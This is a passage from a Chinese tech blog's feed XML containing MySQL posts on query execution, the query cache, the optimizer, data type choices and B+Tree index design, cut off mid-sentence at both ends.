order_no,order_amount FROM sales ORDER BY buyer COLLATE utf8_bin;</span><br></pre></td></tr></tbody></table></figure><p></p><p>当使用两个字符集不同的列来关联两张表时，MySQL 会尝试转换其中一个列的字符集。这和在数据列外面封装一个函数一样，会让 MySQL 无法使用这个列上的索引。关于 MySQL 字符集还有一些坑，但在实际应用场景中遇到的字符集问题，其实不是特别的多，所以就此打住。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>MySQL 还有一些其他高级特性，但在大多数场景下我们很少会使用，因此这里也没有讨论，但多了解一些总是好的，至少在需要的时候，你知道有这样一个东西。我们非常多的人，<strong>总是会认为自己所学的知识就像碎片一样不成体系，又找不到解决办法，那你有没有想过也许是碎片不够多的缘故？点太少，自然不能连接成线，线太少，自然不能结成网</strong>。因而，没有其他办法，<strong>保持好奇心、多学习、多积累，量变总有一天会质变</strong>。</p><p>前面我写的一些文章里面会有提到过，架构设计是一种平衡的艺术，其实质应该是一种妥协，是对现有资源的一种妥协。有时候我们会不自觉的陷入某一个点，比如，为了追求数据的扩展性，很多人一上来就开始分库分表，然后把应用搞得非常复杂，到最后表里还没有装满数据，项目就已经死了。所以在资源有限或者未来还不可知的情况下，尽量使用数据库、语言本身的特性来完成相应的工作，是不是会更好一点。解决大数据问题，也不只是分库分表，你还应该还可以想到分区；有些业务即使在分布式环境下也不一定非要在业务层完成，合理使用存储过程和触发器或者使用自己根据分表分库规则的小工具也许会让你更轻松……</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>高性能 MySQL(第 3 版)</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;img.jpg&quot; class=&quot;full-image&quot; alt=&quot;al
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 优化原理(一)</title>
    <link href="https://jiemin.wang/2019/03/29/mysql-optimization-principle-1/"/>
    <id>https://jiemin.wang/2019/03/29/mysql-optimization-principle-1/</id>
    <published>2019-03-29T06:57:21.000Z</published>
    <updated>2019-03-29T07:42:23.911Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>扫地只不过是我di表面工作，我真正di身份是一位研究——僧。</strong></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说起 MySQL 的查询优化，相信大家收藏了一堆奇技淫巧：不能使用SELECT *、不使用 NULL 字段、合理创建索引、为字段选择合适的数据类型…… 你是否真的理解这些优化技巧？是否理解其背后的工作原理？在实际场景下性能真有提升吗？我想未必。因而理解这些优化建议背后的原理就尤为重要，希望本文能让你重新审视这些优化建议，并在实际业务场景下合理的运用。</p><h4 id="MySQL-逻辑架构"><a href="#MySQL-逻辑架构" class="headerlink" title="MySQL 逻辑架构"></a>MySQL 逻辑架构</h4><p>如果能在头脑中构建一幅 MySQL 各组件之间如何协同工作的架构图，有助于深入理解 MySQL 服务器。下图展示了 MySQL 的逻辑架构图。<br><span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="img.jpg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span></p><p>MySQL 逻辑架构整体分为三层，最上层为客户端层，并非 MySQL 所独有，诸如：连接处理、授权认证、安全等功能均在这一层处理。</p><p>MySQL 大多数核心服务均在中间这一层，包括查询解析、分析、优化、缓存、内置函数 (比如：时间、数学、加密等函数)。所有的跨存储引擎的功能也在这一层实现：存储过程、触发器、视图等。</p><p>最下层为存储引擎，其负责 MySQL 中的数据存储和提取。和 Linux 下的文件系统类似，每种存储引擎都有其优势和劣势。中间的服务层通过 API 与存储引擎通信，这些 API 接口屏蔽了不同存储引擎间的差异。</p><h4 id="MySQL-查询过程"><a href="#MySQL-查询过程" class="headerlink" title="MySQL 查询过程"></a>MySQL 查询过程</h4><p>我们总是希望 MySQL 能够获得更高的查询性能，最好的办法是弄清楚 MySQL 是如何优化和执行查询的。一旦理解了这一点，就会发现：<strong>很多的查询优化工作实际上就是遵循一些原则让 MySQL 的优化器能够按照预想的合理方式运行而已</strong>。</p><p>当向 MySQL 发送一个请求的时候，MySQL 到底做了些什么呢？<br><img src="/2019/03/29/mysql-optimization-principle-1/SQLluoji.jpg" title="SQLluoji"></p><h4 id="客户端-服务端通信协议"><a href="#客户端-服务端通信协议" class="headerlink" title="客户端 / 服务端通信协议"></a>客户端 / 服务端通信协议</h4><p>MySQL 客户端 / 服务端通信协议是 “半双工” 的：在任一时刻，要么是服务器向客户端发送数据，要么是客户端向服务器发送数据，这两个动作不能同时发生。一旦一端开始发送消息，另一端要接收完整个消息才能响应它，所以我们无法也无须将一个消息切成小块独立发送，也没有办法进行流量控制。</p><p>客户端用一个单独的数据包将查询请求发送给服务器，所以当查询语句很长的时候，需要设置<code>max_allowed_packet</code>参数。但是需要注意的是，如果查询实在是太大，服务端会拒绝接收更多数据并抛出异常。</p><p>与之相反的是，服务器响应给用户的数据通常会很多，由多个数据包组成。但是当服务器响应客户端请求时，客户端必须完整的接收整个返回结果，而不能简单的只取前面几条结果，然后让服务器停止发送。因而在实际开发中，尽量保持查询简单且只返回必需的数据，减小通信间数据包的大小和数量是一个非常好的习惯，这也是查询中尽量避免使用<code>SELECT *</code>以及加上<code>LIMIT</code>限制的原因之一。</p><h4 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h4><p>在解析一个查询语句前，如果查询缓存是打开的，那么 MySQL 会检查这个查询语句是否命中查询缓存中的数据。如果当前查询恰好命中查询缓存，在检查一次用户权限后直接返回缓存中的结果。这种情况下，查询不会被解析，也不会生成执行计划，更不会执行。</p><p>MySQL 将缓存存放在一个引用表（不要理解成<code>table</code>，可以认为是类似于<code>HashMap</code>的数据结构），通过一个哈希值索引，这个哈希值通过查询本身、当前要查询的数据库、客户端协议版本号等一些可能影响结果的信息计算得来。所以两个查询在任何字符上的不同（例如：空格、注释），都会导致缓存不会命中。</p><p>如果查询中包含任何用户自定义函数、存储函数、用户变量、临时表、MySQL 库中的系统表，其查询结果都不会被缓存。比如函数<code>NOW()</code>或者<code>CURRENT_DATE()</code>会因为不同的查询时间，返回不同的查询结果，再比如包含<code>CURRENT_USER</code>或者<code>CONNECION_ID()</code>的查询语句会因为不同的用户而返回不同的结果，将这样的查询结果缓存起来没有任何的意义。</p><p>既然是缓存，就会失效，那查询缓存何时失效呢？MySQL 的查询缓存系统会跟踪查询中涉及的每个表，如果这些表（数据或结构）发生变化，那么和这张表相关的所有缓存数据都将失效。正因为如此，在任何的写操作时，MySQL 必须将对应表的所有缓存都设置为失效。如果查询缓存非常大或者碎片很多，这个操作就可能带来很大的系统消耗，甚至导致系统僵死一会儿。而且查询缓存对系统的额外消耗也不仅仅在写操作，读操作也不例外：</p><ul><li>任何的查询语句在开始之前都必须经过检查，即使这条 SQL 语句永远不会命中缓存</li><li>如果查询结果可以被缓存，那么执行完成后，会将结果存入缓存，也会带来额外的系统消耗</li></ul><p>基于此，我们要知道并不是什么情况下查询缓存都会提高系统性能，缓存和失效都会带来额外消耗，只有当缓存带来的资源节约大于其本身消耗的资源时，才会给系统带来性能提升。但要如何评估打开缓存是否能够带来性能提升是一件非常困难的事情，也不在本文讨论的范畴内。如果系统确实存在一些性能问题，可以尝试打开查询缓存，并在数据库设计上做一些优化，比如：</p><ol><li>用多个小表代替一个大表，注意不要过度设计</li><li>批量插入代替循环单条插入</li><li>合理控制缓存空间大小，一般来说其大小设置为几十兆比较合适</li><li>可以通过SQL_CACHE和SQL_NO_CACHE来控制某个查询语句是否需要进行缓存</li></ol><p>最后的忠告是不要轻易打开查询缓存，特别是写密集型应用。如果你实在是忍不住，可以将<code>query_cache_type</code>设置为<code>DEMAND</code>，这时只有加入<code>SQL_CACHE</code>的查询才会走缓存，其他查询则不会，这样可以非常自由地控制哪些查询需要被缓存。</p><p>当然查询缓存系统本身是非常复杂的，这里讨论的也只是很小的一部分，其他更深入的话题，比如：缓存是如何使用内存的？如何控制内存的碎片化？事务对查询缓存有何影响等等，读者可以自行阅读相关资料，这里权当抛砖引玉吧。</p><h4 id="语法解析和预处理"><a href="#语法解析和预处理" class="headerlink" title="语法解析和预处理"></a>语法解析和预处理</h4><p>MySQL 通过关键字将 SQL 语句进行解析，并生成一颗对应的解析树。这个过程解析器主要通过语法规则来验证和解析。比如 SQL 中是否使用了错误的关键字或者关键字的顺序是否正确等等。预处理则会根据 MySQL 规则进一步检查解析树是否合法。比如检查要查询的数据表和数据列是否存在等等。</p><h4 id="查询优化"><a href="#查询优化" class="headerlink" title="查询优化"></a>查询优化</h4><p>经过前面的步骤生成的语法树被认为是合法的了，并且由优化器将其转化成查询计划。多数情况下，一条查询可以有很多种执行方式，最后都返回相应的结果。优化器的作用就是找到这其中最好的执行计划。</p><p>MySQL 使用基于成本的优化器，它尝试预测一个查询使用某种执行计划时的成本，并选择其中成本最小的一个。在 MySQL 可以通过查询当前会话的last_query_cost的值来得到其计算当前查询的成本。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql> select * from t_message <span class="built_in">limit</span> 10;</span><br><span class="line">...省略结果集</span><br><span class="line"></span><br><span class="line">mysql> show status like <span class="string">'last_query_cost'</span>;</span><br><span class="line">+-----------------+-------------+</span><br><span class="line">| Variable_name   | Value       |</span><br><span class="line">+-----------------+-------------+</span><br><span class="line">| Last_query_cost | 6391.799000 |</span><br><span class="line">+-----------------+-------------+</span><br></pre></td></tr></tbody></table></figure><p></p><p>示例中的结果表示优化器认为大概需要做 6391 个数据页的随机查找才能完成上面的查询。这个结果是根据一些列的统计信息计算得来的，这些统计信息包括：每张表或者索引的页面个数、索引的基数、索引和数据行的长度、索引的分布情况等等。</p><p>有非常多的原因会导致 MySQL 选择错误的执行计划，比如统计信息不准确、不会考虑不受其控制的操作成本（用户自定义函数、存储过程）、MySQL 认为的最优跟我们想的不一样（我们希望执行时间尽可能短，但 MySQL 只选择它认为成本小的，但成本小并不意味着执行时间短）等等。</p><p>MySQL 的查询优化器是一个非常复杂的部件，它使用了非常多的优化策略来生成一个最优的执行计划：</p><ul><li>重新定义表的关联顺序（多张表关联查询时，并不一定按照 SQL 中指定的顺序进行，但有一些技巧可以指定关联顺序）</li><li>优化MIN()和MAX()函数（找某列的最小值，如果该列有索引，只需要查找 B+Tree 索引最左端，反之则可以找到最大值，具体原理见下文）</li><li>提前终止查询（比如：使用 Limit 时，查找到满足数量的结果集后会立即终止查询）</li><li>优化排序（在老版本 MySQL 会使用两次传输排序，即先读取行指针和需要排序的字段在内存中对其排序，然后再根据排序结果去读取数据行，而新版本采用的是单次传输排序，也就是一次读取所有的数据行，然后根据给定的列排序。对于 I/O 密集型应用，效率会高很多）</li></ul><p>随着 MySQL 的不断发展，优化器使用的优化策略也在不断的进化，这里仅仅介绍几个非常常用且容易理解的优化策略，其他的优化策略，大家自行查阅吧。</p><h4 id="查询执行引擎"><a href="#查询执行引擎" class="headerlink" title="查询执行引擎"></a>查询执行引擎</h4><p>在完成解析和优化阶段以后，MySQL 会生成对应的执行计划，查询执行引擎根据执行计划给出的指令逐步执行得出结果。整个执行过程的大部分操作均是通过调用存储引擎实现的接口来完成，这些接口被称为<code>handler API</code>。查询过程中的每一张表由一个<code>handler</code>实例表示。实际上，MySQL 在查询优化阶段就为每一张表创建了一个<code>handler</code>实例，优化器可以根据这些实例的接口来获取表的相关信息，包括表的所有列名、索引统计信息等。存储引擎接口提供了非常丰富的功能，但其底层仅有几十个接口，这些接口像搭积木一样完成了一次查询的大部分操作。</p><h4 id="返回结果给客户端"><a href="#返回结果给客户端" class="headerlink" title="返回结果给客户端"></a>返回结果给客户端</h4><p>查询执行的最后一个阶段就是将结果返回给客户端。即使查询不到数据，MySQL 仍然会返回这个查询的相关信息，比如该查询影响到的行数以及执行时间等等。</p><p>如果查询缓存被打开且这个查询可以被缓存，MySQL 也会将结果存放到缓存中。</p><p>结果集返回客户端是一个增量且逐步返回的过程。有可能 MySQL 在生成第一条结果时，就开始向客户端逐步返回结果集了。这样服务端就无须存储太多结果而消耗过多内存，也可以让客户端第一时间获得返回结果。需要注意的是，结果集中的每一行都会以一个满足 ① 中所描述的通信协议的数据包发送，再通过 TCP 协议进行传输，在传输过程中，可能对 MySQL 的数据包进行缓存然后批量发送。</p><p>回头总结一下 MySQL 整个查询执行过程，总的来说分为 5 个步骤：</p><ol><li>客户端向 MySQL 服务器发送一条查询请求</li><li>服务器首先检查查询缓存，如果命中缓存，则立刻返回存储在缓存中的结果。否则进入下一阶段</li><li>服务器进行 SQL 解析、预处理、再由优化器生成对应的执行计划</li><li>MySQL 根据执行计划，调用存储引擎的 API 来执行查询</li><li>将结果返回给客户端，同时缓存查询结果</li></ol><h4 id="性能优化建议"><a href="#性能优化建议" class="headerlink" title="性能优化建议"></a>性能优化建议</h4><p>看了这么多，你可能会期待给出一些优化手段，是的，下面会从 3 个不同方面给出一些优化建议。但请等等，还有一句忠告要先送给你：不要听信你看到的关于优化的 “绝对真理”，包括本文所讨论的内容，而应该是在实际的业务场景下通过测试来验证你关于执行计划以及响应时间的假设。</p><p><strong>Scheme 设计与数据类型优化</strong></p><p>选择数据类型只要遵循小而简单的原则就好，越小的数据类型通常会更快，占用更少的磁盘、内存，处理时需要的 CPU 周期也更少。越简单的数据类型在计算时需要更少的 CPU 周期，比如，整型就比字符操作代价低，因而会使用整型来存储 IP 地址，使用DATETIME来存储时间，而不是使用字符串。</p><p>这里总结几个可能容易理解错误的技巧：</p><ol><li>通常来说把可为<code>NULL</code>的列改为<code>NOT NULL</code>不会对性能提升有多少帮助，只是如果计划在列上创建索引，就应该将该列设置为<code>NOT NULL</code>。</li><li>对整数类型指定宽度，比如<code>INT(11)</code>，没有任何卵用。<code>INT</code>使用 <code>32</code> 位（<code>4</code> 个字节）存储空间，那么它的表示范围已经确定，所以<code>INT(1)</code>和<code>INT(20)</code>对于存储和计算是相同的。</li><li><code>UNSIGNED</code>表示不允许负值，大致可以使正数的上限提高一倍。比如<code>TINYINT</code>存储范围是 <code>-128 ~ 127</code>，而<code>UNSIGNED TINYINT</code>存储的范围却是 <code>0 - 255</code>。</li><li>通常来讲，没有太大的必要使用<code>DECIMAL</code>数据类型。即使是在需要存储财务数据时，仍然可以使用<code>BIGINT</code>。比如需要精确到万分之一，那么可以将数据乘以一百万然后使用<code>BIGINT</code>存储。这样可以避免浮点数计算不准确和<code>DECIMAL</code>精确计算代价高的问题。</li><li><code>TIMESTAMP</code>使用 4 个字节存储空间，<code>DATETIME</code>使用 <code>8</code> 个字节存储空间。因而，<code>TIMESTAMP</code>只能表示 <code>1970 - 2038</code> 年，比<code>DATETIME</code>表示的范围小得多，而且<code>TIMESTAMP</code>的值因时区不同而不同。</li><li>大多数情况下没有使用枚举类型的必要，其中一个缺点是枚举的字符串列表是固定的，添加和删除字符串（枚举选项）必须使用<code>ALTER TABLE</code>（如果只只是在列表末尾追加元素，不需要重建表）。</li><li><code>schema</code> 的列不要太多。原因是存储引擎的 API 工作时需要在服务器层和存储引擎层之间通过行缓冲格式拷贝数据，然后在服务器层将缓冲内容解码成各个列，这个转换过程的代价是非常高的。如果列太多而实际使用的列又很少的话，有可能会导致 <code>CPU</code> 占用过高。</li><li>大表<code>ALTER TABLE</code>非常耗时，MySQL 执行大部分修改表结果操作的方法是用新的结构创建一个张空表，从旧表中查出所有的数据插入新表，然后再删除旧表。尤其当内存不足而表又很大，而且还有很大索引的情况下，耗时更久。当然有一些奇技淫巧可以解决这个问题，有兴趣可自行查阅。</li></ol><p><strong>创建高性能索引</strong><br>索引是提高 MySQL 查询性能的一个重要途径，但过多的索引可能会导致过高的磁盘使用率以及过高的内存占用，从而影响应用程序的整体性能。应当尽量避免事后才想起添加索引，因为事后可能需要监控大量的 SQL 才能定位到问题所在，而且添加索引的时间肯定是远大于初始添加索引所需要的时间，可见索引的添加也是非常有技术含量的。</p><p>接下来将向你展示一系列创建高性能索引的策略，以及每条策略其背后的工作原理。但在此之前，先了解与索引相关的一些算法和数据结构，将有助于更好的理解后文的内容。</p><p><strong>索引相关的数据结构和算法</strong></p><p>通常我们所说的索引是指<code>B-Tree</code>索引，它是目前关系型数据库中查找数据最为常用和有效的索引，大多数存储引擎都支持这种索引。使用<code>B-Tree</code>这个术语，是因为 MySQL 在<code>CREATE TABLE</code>或其它语句中使用了这个关键字，但实际上不同的存储引擎可能使用不同的数据结构，比如 InnoDB 就是使用的是它的变种B+Tree。</p><p><code>B+Tree</code>中的 B 是指<code>balance</code>，意为平衡。需要注意的是，B + 树索引并不能找到一个给定键值的具体行，它找到的只是被查找数据行所在的页，接着数据库会把页读入到内存，再在内存中进行查找，最后得到要查找的数据。</p><p>在介绍<code>B+Tree</code>前，先了解一下二叉查找树，它是一种经典的数据结构，其左子树的值总是小于根的值，右子树的值总是大于根的值，如下图 ①。如果要在这课树中查找值为 5 的记录，其大致流程：先找到根，其值为 6，大于 5，所以查找左子树，找到 3，而 5 大于 3，接着找 3 的右子树，总共找了 3 次。同样的方法，如果查找值为 8 的记录，也需要查找 3 次。所以二叉查找树的平均查找次数为 (3 + 3 + 3 + 2 + 2 + 1) / 6 = 2.3 次，而顺序查找的话，查找值为 2 的记录，仅需要 1 次，但查找值为 8 的记录则需要 6 次，所以顺序查找的平均查找次数为：(1 + 2 + 3 + 4 + 5 + 6) / 6 = 3.3 次，因此大多数情况下二叉查找树的平均查找速度比顺序查找要快。</p><p>由于二叉查找树可以任意构造，同样的值，可以构造出如图 ② 的二叉查找树，显然这棵二叉树的查询效率和顺序查找差不多。若想二叉查找数的查询性能最高，需要这棵二叉查找树是平衡的，也即平衡二叉树（AVL 树）。<br><img src="/2019/03/29/mysql-optimization-principle-1/shu.jpg" title="shu"></p><p>平衡二叉树首先需要符合二叉查找树的定义，其次必须满足任何节点的两个子树的高度差不能大于 1。显然图 ② 不满足平衡二叉树的定义，而图 ① 是一课平衡二叉树。平衡二叉树的查找性能是比较高的（性能最好的是最优二叉树），查询性能越好，维护的成本就越大。比如图 ① 的平衡二叉树，当用户需要插入一个新的值 9 的节点时，就需要做出如下变动。<br><img src="/2019/03/29/mysql-optimization-principle-1/ershu.jpg" title="ershu"></p><p>通过一次左旋操作就将插入后的树重新变为平衡二叉树是最简单的情况了，实际应用场景中可能需要旋转多次。至此我们可以考虑一个问题，平衡二叉树的查找效率还不错，实现也非常简单，相应的维护成本还能接受，为什么 MySQL 索引不直接使用平衡二叉树？</p><p>随着数据库中数据的增加，索引本身大小随之增加，不可能全部存储在内存中，因此索引往往以索引文件的形式存储的磁盘上。这样的话，索引查找过程中就要产生磁盘 I/O 消耗，相对于内存存取，I/O 存取的消耗要高几个数量级。可以想象一下一棵几百万节点的二叉树的深度是多少？如果将这么大深度的一颗二叉树放磁盘上，每读取一个节点，需要一次磁盘的 I/O 读取，整个查找的耗时显然是不能够接受的。那么如何减少查找过程中的 I/O 存取次数？</p><p>一种行之有效的解决方法是减少树的深度，将二叉树变为 m 叉树（多路搜索树），而B+Tree就是一种多路搜索树。理解B+Tree时，只需要理解其最重要的两个特征即可：第一，所有的关键字（可以理解为数据）都存储在叶子节点（Leaf Page），非叶子节点（Index Page）并不存储真正的数据，所有记录节点都是按键值大小顺序存放在同一层叶子节点上。其次，所有的叶子节点由指针连接。如下图为高度为 2 的简化了的B+Tree。<br><img src="/2019/03/29/mysql-optimization-principle-1/erbtree.jpg" title="erbtree"></p><p>怎么理解这两个特征？MySQL 将每个节点的大小设置为一个页的整数倍（原因下文会介绍），也就是在节点空间大小一定的情况下，每个节点可以存储更多的内结点，这样每个结点能索引的范围更大更精确。所有的叶子节点使用指针链接的好处是可以进行区间访问，比如上图中，如果查找大于 20 而小于 30 的记录，只需要找到节点 20，就可以遍历指针依次找到 25、30。如果没有链接指针的话，就无法进行区间查找。这也是 MySQL 使用B+Tree作为索引存储结构的重要原因。</p><p>MySQL 为何将节点大小设置为页的整数倍，这就需要理解磁盘的存储原理。磁盘本身存取就比主存慢很多，在加上机械运动损耗（特别是普通的机械硬盘），磁盘的存取速度往往是主存的几百万分之一，为了尽量减少磁盘 I/O，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存，预读的长度一般为页的整数倍。</p><blockquote><p>页是计算机管理存储器的逻辑块，硬件及 OS 往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（许多 OS 中，页的大小通常为 4K）。主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后一起返回，程序继续运行。</p></blockquote><p>MySQL 巧妙利用了磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次 I/O 就可以完全载入。为了达到这个目的，每次新建节点时，直接申请一个页的空间，这样就保证一个节点物理上也存储在一个页里，加之计算机存储分配都是按页对齐的，就实现了读取一个节点只需一次 I/O。假设B+Tree的高度为 h，一次检索最多需要h-1次 I/O（根节点常驻内存），复杂度 O(h) = O(logmN)。实际应用场景中，M 通常较大，常常超过 100，因此树的高度一般都比较小，通常不超过 3。</p><p>最后简单了解下B+Tree节点的操作，在整体上对索引的维护有一个大概的了解，虽然索引可以大大提高查询效率，但维护索引仍要花费很大的代价，因此合理的创建索引也就尤为重要。</p><p>仍以上面的树为例，我们假设每个节点只能存储 4 个内节点。首先要插入第一个节点 28，如下图所示。<br><img src="/2019/03/29/mysql-optimization-principle-1/chazhao.jpg" title="chazhao"></p><p>接着插入下一个节点 70，在 Index Page 中查询后得知应该插入到 50 - 70 之间的叶子节点，但叶子节点已满，这时候就需要进行也分裂的操作，当前的叶子节点起点为 50，所以根据中间值来拆分叶子节点，如下图所示。<br><img src="/2019/03/29/mysql-optimization-principle-1/pagechazhao.jpg" title="pagechazhao"></p><p>最后插入一个节点 95，这时候 Index Page 和 Leaf Page 都满了，就需要做两次拆分，如下图所示。<br><img src="/2019/03/29/mysql-optimization-principle-1/zhaodao.jpg" title="zhaodao"></p><p>Leaf Page 与 Index Page 拆分后最终形成了这样一颗树。<br><img src="/2019/03/29/mysql-optimization-principle-1/leaf.jpg" title="leaf"></p><p>B+Tree为了保持平衡，对于新插入的值需要做大量的拆分页操作，而页的拆分需要 I/O 操作，为了尽可能的减少页的拆分操作，B+Tree也提供了类似于平衡二叉树的旋转功能。当 Leaf Page 已满但其左右兄弟节点没有满的情况下，B+Tree并不急于去做拆分操作，而是将记录移到当前所在页的兄弟节点上。通常情况下，左兄弟会被先检查用来做旋转操作。就比如上面第二个示例，当插入 70 的时候，并不会去做页拆分，而是左旋操作。<br><img src="/2019/03/29/mysql-optimization-principle-1/zuoxuan.jpg" title="zuoxuan"></p><p>通过旋转操作可以最大限度的减少页分裂，从而减少索引维护过程中的磁盘的 I/O 操作，也提高索引维护效率。需要注意的是，删除节点跟插入节点类似，仍然需要旋转和拆分操作，这里就不再说明。</p><p><strong>高性能策略</strong><br>通过上文，相信你对B+Tree的数据结构已经有了大致的了解，但 MySQL 中索引是如何组织数据的存储呢？以一个简单的示例来说明，假如有如下数据表：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE People(</span><br><span class="line">    last_name varchar(50) not null,</span><br><span class="line">    first_name varchar(50) not null,</span><br><span class="line">    dob date not null,</span><br><span class="line">    gender enum(`m`,`f`) not null,</span><br><span class="line">    key(last_name,first_name,dob)</span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure><p></p><p>对于表中每一行数据，索引中包含了 last_name、first_name、dob 列的值，下图展示了索引是如何组织数据存储的。<br><img src="/2019/03/29/mysql-optimization-principle-1/IMG.png" title="IMG"></p><p>可以看到，索引首先根据第一个字段来排列顺序，当名字相同时，则根据第三个字段，即出生日期来排序，正是因为这个原因，才有了索引的 “最左原则”。</p><p><strong>MySQL 不会使用索引的情况：非独立的列</strong></p><p>“独立的列” 是指索引列不能是表达式的一部分，也不能是函数的参数。比如：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="built_in">where</span> id + 1 = 5</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们很容易看出其等价于 id = 4，但是 MySQL 无法自动解析这个表达式，使用函数是同样的道理。</p><p><strong>前缀索引</strong><br>如果列很长，通常可以索引开始的部分字符，这样可以有效节约索引空间，从而提高索引效率。</p><p><strong>多列索引和索引顺序</strong><br>在多数情况下，在多个列上建立独立的索引并不能提高查询性能。理由非常简单，MySQL 不知道选择哪个索引的查询效率更好，所以在老版本，比如 MySQL5.0 之前就会随便选择一个列的索引，而新的版本会采用合并索引的策略。举个简单的例子，在一张电影演员表中，在 actor_id 和 film_id 两个列上都建立了独立的索引，然后有如下查询：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select film_id,actor_id from film_actor <span class="built_in">where</span> actor_id = 1 or film_id = 1</span><br></pre></td></tr></tbody></table></figure><p>老版本的 MySQL 会随机选择一个索引，但新版本做如下的优化：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select film_id,actor_id from film_actor <span class="built_in">where</span> actor_id = 1</span><br><span class="line">union all</span><br><span class="line">select film_id,actor_id from film_actor <span class="built_in">where</span> film_id = 1 and actor_id <> 1</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>当出现多个索引做相交操作时（多个 AND 条件），通常来说一个包含所有相关列的索引要优于多个独立索引。</li><li>当出现多个索引做联合操作时（多个 OR 条件），对结果集的合并、排序等操作需要耗费大量的 CPU 和内存资源，特别是当其中的某些索引的选择性不高，需要返回合并大量数据时，查询成本更高。所以这种情况下还不如走全表扫描。</li></ul><p>因此explain时如果发现有索引合并（Extra 字段出现Using union），应该好好检查一下查询和表结构是不是已经是最优的，如果查询和表都没有问题，那只能说明索引建的非常糟糕，应当慎重考虑索引是否合适，有可能一个包含所有相关列的多列索引更适合。</p><p>前面我们提到过索引如何组织数据存储的，从图中可以看到多列索引时，索引的顺序对于查询是至关重要的，很明显应该把选择性更高的字段放到索引的前面，这样通过第一个字段就可以过滤掉大多数不符合条件的数据。</p><blockquote><p>索引选择性是指不重复的索引值和数据表的总记录数的比值，选择性越高查询效率越高，因为选择性越高的索引可以让 MySQL 在查询时过滤掉更多的行。唯一索引的选择性是 1，这是最好的索引选择性，性能也是最好的。</p></blockquote><p>理解索引选择性的概念后，就不难确定哪个字段的选择性较高了，查一下就知道了，比如：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM payment <span class="built_in">where</span> staff_id = 2 and customer_id = 584</span><br></pre></td></tr></tbody></table></figure><p></p><p>是应该创建<code>(staff_id,customer_id)</code>的索引还是应该颠倒一下顺序？执行下面的查询，哪个字段的选择性更接近 1 就把哪个字段索引前面就好。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(distinct staff_id)/count(*) as staff_id_selectivity,</span><br><span class="line">       count(distinct customer_id)/count(*) as customer_id_selectivity,</span><br><span class="line">       count(*) from payment</span><br></pre></td></tr></tbody></table></figure><p></p><p>多数情况下使用这个原则没有任何问题，但仍然注意你的数据中是否存在一些特殊情况。举个简单的例子，比如要查询某个用户组下有过交易的用户信息：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user_id from trade <span class="built_in">where</span> user_group_id = 1 and trade_amount > 0</span><br></pre></td></tr></tbody></table></figure><p></p><p>MySQL 